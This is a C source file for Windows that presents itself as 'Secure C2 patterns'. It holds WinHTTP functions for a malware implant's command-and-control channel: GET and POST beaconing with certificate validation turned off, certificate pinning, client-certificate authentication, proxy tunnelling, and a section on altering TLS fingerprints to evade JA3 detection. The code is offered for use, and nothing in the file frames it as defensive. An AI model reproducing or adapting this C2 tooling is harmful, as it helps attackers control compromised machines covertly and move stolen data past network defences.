/*
 * HTTPS Communication - SSL/TLS, cert bypass, pinning
 * Secure C2 patterns
 */

#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")

// ============================================================================
// SSL CONFIG
// ============================================================================

#pragma pack(push,1)
typedef struct {
    BOOL  ignore_cert;
    BOOL  pin_cert;
    BYTE  pin_hash[32];  // SHA256
    DWORD protocols;
} SSL_CFG;
#pragma pack(pop)

// ============================================================================
// HTTPS REQUEST
// ============================================================================

BOOL https_req(WCHAR* host, WORD port, WCHAR* uri, SSL_CFG* ssl, BYTE** out, DWORD* len)
{
    HINTERNET hS = 0, hC = 0, hR = 0;
    BOOL ret = 0;

    hS = WinHttpOpen(L"Mozilla/5.0", 0, 0, 0, 0);
    if(!hS) return 0;

    // Set TLS version
    if(ssl->protocols) {
        WinHttpSetOption(hS, 84, &ssl->protocols, sizeof(ssl->protocols));
    }

    hC = WinHttpConnect(hS, host, port, 0);
    if(!hC) goto end;

    hR = WinHttpOpenRequest(hC, L"GET", uri, 0, 0, 0, 0x800000);
    if(!hR) goto end;

    // Bypass cert errors
    if(ssl->ignore_cert) {
        DWORD flags = 0x100 | 0x200 | 0x1000 | 0x2000;  // IGNORE_*
        WinHttpSetOption(hR, 31, &flags, sizeof(flags));
    }

    if(!WinHttpSendRequest(hR, 0, 0, 0, 0, 0, 0)) goto end;
    if(!WinHttpReceiveResponse(hR, 0)) goto end;

    // Certificate pinning check
    if(ssl->pin_cert) {
        PCCERT_CONTEXT pCert = 0;
        DWORD sz = sizeof(pCert);

        if(WinHttpQueryOption(hR, 44, &pCert, &sz)) {  // WINHTTP_OPTION_SERVER_CERT_CONTEXT
            BYTE hash[32];
            DWORD hsz = sizeof(hash);
            CryptHashCertificate(0, 0x800c, 0, pCert->pbCertEncoded, pCert->cbCertEncoded, hash, &hsz);

            BOOL match = 1;
            for(int i = 0; i < 32; i++) {
                if(hash[i] != ssl->pin_hash[i]) { match = 0; break; }
            }

            CertFreeCertificateContext(pCert);
            if(!match) goto end;  // Pin mismatch
        }
    }

    // Read response
    DWORD sz = 0, dl = 0, total = 0;
    *out = 0;

    do {
        WinHttpQueryDataAvailable(hR, &sz);
        if(!sz) break;

        *out = *out ? HeapReAlloc(GetProcessHeap(), 0, *out, total + sz + 1)
                    : HeapAlloc(GetProcessHeap(), 0, sz + 1);

        WinHttpReadData(hR, *out + total, sz, &dl);
        total += dl;
    } while(sz);

    *len = total;
    ret = 1;

end:
    if(hR) WinHttpCloseHandle(hR);
    if(hC) WinHttpCloseHandle(hC);
    if(hS) WinHttpCloseHandle(hS);
    return ret;
}

// ============================================================================
// HTTPS POST
// ============================================================================

BOOL https_post(WCHAR* host, WORD port, WCHAR* uri, SSL_CFG* ssl,
                BYTE* data, DWORD dlen, BYTE** out, DWORD* olen)
{
    HINTERNET hS, hC, hR;
    BOOL ret = 0;

    hS = WinHttpOpen(L"Mozilla/5.0", 0, 0, 0, 0);
    hC = WinHttpConnect(hS, host, port, 0);
    hR = WinHttpOpenRequest(hC, L"POST", uri, 0, 0, 0, 0x800000);

    if(ssl->ignore_cert) {
        DWORD flags = 0x3300;
        WinHttpSetOption(hR, 31, &flags, sizeof(flags));
    }

    WCHAR hdr[] = L"Content-Type: application/octet-stream\r\n";

    if(!WinHttpSendRequest(hR, hdr, -1, data, dlen, dlen, 0)) goto end;
    if(!WinHttpReceiveResponse(hR, 0)) goto end;

    DWORD sz, dl, total = 0;
    *out = 0;

    do {
        WinHttpQueryDataAvailable(hR, &sz);
        if(!sz) break;
        *out = *out ? HeapReAlloc(GetProcessHeap(), 0, *out, total + sz)
                    : HeapAlloc(GetProcessHeap(), 0, sz);
        WinHttpReadData(hR, *out + total, sz, &dl);
        total += dl;
    } while(sz);

    *olen = total;
    ret = 1;

end:
    WinHttpCloseHandle(hR);
    WinHttpCloseHandle(hC);
    WinHttpCloseHandle(hS);
    return ret;
}

// ============================================================================
// CLIENT CERTIFICATE AUTH
// ============================================================================

BOOL https_client_cert(WCHAR* host, WCHAR* uri, WCHAR* certName, BYTE** out, DWORD* len)
{
    HINTERNET hS, hC, hR;
    BOOL ret = 0;

    hS = WinHttpOpen(L"Agent", 0, 0, 0, 0);
    hC = WinHttpConnect(hS, host, 443, 0);
    hR = WinHttpOpenRequest(hC, L"GET", uri, 0, 0, 0, 0x800000);

    // Open cert store
    HCERTSTORE hStore = CertOpenSystemStoreW(0, L"MY");
    if(!hStore) goto end;

    // Find cert
    PCCERT_CONTEXT pCert = CertFindCertificateInStore(
        hStore, 0x10001, 0, 0x80007, certName, 0);

    if(pCert) {
        WinHttpSetOption(hR, 47, (void*)pCert, sizeof(CERT_CONTEXT));
        CertFreeCertificateContext(pCert);
    }

    CertCloseStore(hStore, 0);

    DWORD sslf = 0x3300;
    WinHttpSetOption(hR, 31, &sslf, sizeof(sslf));

    if(!WinHttpSendRequest(hR, 0, 0, 0, 0, 0, 0)) goto end;
    if(!WinHttpReceiveResponse(hR, 0)) goto end;

    // Read response
    DWORD sz, dl, total = 0;
    *out = 0;

    do {
        WinHttpQueryDataAvailable(hR, &sz);
        if(!sz) break;
        *out = *out ? HeapReAlloc(GetProcessHeap(), 0, *out, total + sz)
                    : HeapAlloc(GetProcessHeap(), 0, sz);
        WinHttpReadData(hR, *out + total, sz, &dl);
        total += dl;
    } while(sz);

    *len = total;
    ret = 1;

end:
    WinHttpCloseHandle(hR);
    WinHttpCloseHandle(hC);
    WinHttpCloseHandle(hS);
    return ret;
}

// ============================================================================
// PROXY TUNNEL (CONNECT method)
// ============================================================================

BOOL https_via_proxy(WCHAR* proxy, WCHAR* host, WCHAR* uri, SSL_CFG* ssl, BYTE** out, DWORD* len)
{
    HINTERNET hS, hC, hR;
    BOOL ret = 0;

    hS = WinHttpOpen(L"Mozilla/5.0", 3, proxy, L"<local>", 0);
    if(!hS) return 0;

    hC = WinHttpConnect(hS, host, 443, 0);
    hR = WinHttpOpenRequest(hC, L"GET", uri, 0, 0, 0, 0x800000);

    DWORD sslf = 0x3300;
    WinHttpSetOption(hR, 31, &sslf, sizeof(sslf));

    if(!WinHttpSendRequest(hR, 0, 0, 0, 0, 0, 0)) goto end;
    if(!WinHttpReceiveResponse(hR, 0)) goto end;

    DWORD sz, dl, total = 0;
    *out = 0;

    do {
        WinHttpQueryDataAvailable(hR, &sz);
        if(!sz) break;
        *out = *out ? HeapReAlloc(GetProcessHeap(), 0, *out, total + sz)
                    : HeapAlloc(GetProcessHeap(), 0, sz);
        WinHttpReadData(hR, *out + total, sz, &dl);
        total += dl;
    } while(sz);

    *len = total;
    ret = 1;

end:
    WinHttpCloseHandle(hR);
    WinHttpCloseHandle(hC);
    WinHttpCloseHandle(hS);
    return ret;
}

// ============================================================================
// CERT HASH EXTRACTION
// ============================================================================

BOOL get_cert_hash(HINTERNET hR, BYTE* hash)
{
    PCCERT_CONTEXT pCert = 0;
    DWORD sz = sizeof(pCert);

    if(!WinHttpQueryOption(hR, 44, &pCert, &sz)) return 0;

    DWORD hsz = 32;
    CryptHashCertificate(0, 0x800c, 0, pCert->pbCertEncoded, pCert->cbCertEncoded, hash, &hsz);

    CertFreeCertificateContext(pCert);
    return 1;
}

// ============================================================================
// JA3 MITIGATION
// ============================================================================

/*
 * JA3 = hash of TLS client hello parameters
 * To evade detection:
 * - Force specific TLS version
 * - Use alternative TLS library
 * - Modify cipher suites (not possible with WinHTTP)
 */

BOOL https_ja3_mod(WCHAR* host, WCHAR* uri, DWORD tlsver, BYTE** out, DWORD* len)
{
    HINTERNET hS, hC, hR;

    hS = WinHttpOpen(L"Mozilla/5.0", 0, 0, 0, 0);

    // Force specific TLS
    WinHttpSetOption(hS, 84, &tlsver, sizeof(tlsver));

    hC = WinHttpConnect(hS, host, 443, 0);
    hR = WinHttpOpenRequest(hC, L"GET", uri, 0, 0, 0, 0x800000);

    DWORD sslf = 0x3300;
    WinHttpSetOption(hR, 31, &sslf, sizeof(sslf));

    BOOL ret = WinHttpSendRequest(hR, 0, 0, 0, 0, 0, 0) &&
               WinHttpReceiveResponse(hR, 0);

    if(ret) {
        DWORD sz, dl, total = 0;
        *out = 0;
        do {
            WinHttpQueryDataAvailable(hR, &sz);
            if(!sz) break;
            *out = *out ? HeapReAlloc(GetProcessHeap(), 0, *out, total + sz)
                        : HeapAlloc(GetProcessHeap(), 0, sz);
            WinHttpReadData(hR, *out + total, sz, &dl);
            total += dl;
        } while(sz);
        *len = total;
    }

    WinHttpCloseHandle(hR);
    WinHttpCloseHandle(hC);
    WinHttpCloseHandle(hS);
    return ret;
}

// ============================================================================
// EOF
// ============================================================================
